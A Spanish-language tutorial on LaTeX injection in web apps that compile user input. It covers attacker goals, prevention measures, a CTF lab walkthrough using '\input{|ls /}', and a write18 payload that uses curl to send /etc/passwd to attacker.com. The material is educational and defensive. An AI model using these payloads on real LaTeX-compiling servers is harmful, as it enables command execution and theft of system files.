# LaTeX Injection: Inyección de código en entornos que procesan LaTeX

Las **inyecciones LaTeX** son un tipo de vulnerabilidad que afecta a aplicaciones web que permiten a los usuarios introducir texto formateado con **LaTeX**, un sistema de composición de textos muy utilizado en entornos académicos y científicos.

## ¿En qué consiste la vulnerabilidad?

Una **inyección LaTeX** se produce cuando un atacante introduce código LaTeX malicioso en un campo de entrada de una aplicación web que luego se procesa y compila con un motor LaTeX (como `pdflatex`, `xelatex`, etc.) en el servidor.

Algunos motores de LaTeX permiten la inclusión de comandos que pueden acceder a archivos del sistema, ejecutar comandos del sistema o generar archivos PDF que comprometan la seguridad del entorno.

---

## ¿Qué puede hacer un atacante?

Un atacante podría, por ejemplo:

- Leer archivos sensibles del servidor (`/etc/passwd`, `.ssh/id_rsa`, etc.).
- Ejecutar comandos del sistema si el motor LaTeX lo permite.
- Incluir gráficos o archivos remotos maliciosos.
- Crear archivos PDF con contenido manipulado o con enlaces maliciosos.

---

## Medidas de prevención

Para prevenir ataques de inyección LaTeX:

- **Sanitizar las entradas del usuario:** eliminar caracteres especiales y comandos peligrosos.
- **Ejecutar el compilador LaTeX en entornos aislados** como contenedores o sandboxes (`Docker`, `AppArmor`, etc.).
- **Usar perfiles seguros de compilación:** restringir el uso de comandos inseguros.
- **Aplicar el principio de mínimos privilegios** en los servicios que manejan entradas LaTeX.
- **Monitorear el sistema** ante cualquier comportamiento anómalo.

---

## Ejemplo práctico (laboratorio vulnerable)

Puedes practicar esta vulnerabilidad usando el siguiente laboratorio vulnerable:

🔗 [Internetwache CTF 2016 - LaTeX Injection](https://github.com/internetwache/Internetwache-CTF-2016/tree/master/tasks/web90/code)

### Instrucciones básicas:
1. Clona el repositorio:
   ```bash
   git clone https://github.com/internetwache/Internetwache-CTF-2016.git
   cd Internetwache-CTF-2016/tasks/web90/code
```

2. Lanza el servidor (puedes usar `python3 -m http.server` o montar el entorno con Docker).
    
3. Introduce entradas como esta en el formulario LaTeX:
    
    ```latex
    \input{|ls /}
    ```
    
    Esto listará el contenido del directorio raíz si el motor LaTeX no está aislado.
    

---

## Ejemplo real: ShareLaTeX (ahora Overleaf)

En 2016, investigadores de seguridad encontraron que algunas implementaciones de **ShareLaTeX** permitían ejecutar comandos arbitrarios mediante entradas LaTeX maliciosas si no se aplicaban restricciones adecuadas.

**Ejemplo de payload**:

```latex
\immediate\write18{curl http://attacker.com/`cat /etc/passwd`}
```

Este payload envía el contenido de `/etc/passwd` al servidor del atacante, si `\write18` está habilitado, lo cual permite ejecutar comandos de shell en el sistema que compila el LaTeX.

- Fuente: [LaTeX Injection via \write18 - Bishop Fox Labs](https://labs.bishopfox.com/tech-blog/latex-injection)

---

## Recursos adicionales

- [Overleaf Security](https://www.overleaf.com/security)
    
- [LaTeX \write18 documentation](https://www.tug.org/texinfohtml/latex2e.html#Shell-escape)
    
- [Repositorio Internetwache CTF 2016 - Web90](https://github.com/internetwache/Internetwache-CTF-2016/tree/master/tasks/web90/code)
    

---

## Conclusión

Las aplicaciones que procesan entradas LaTeX deben tratarse con el mismo nivel de desconfianza que cualquier otra entrada del usuario. Las inyecciones LaTeX pueden permitir desde filtración de información hasta ejecución de comandos en el servidor si no se toman las medidas adecuadas de aislamiento y validación.

---

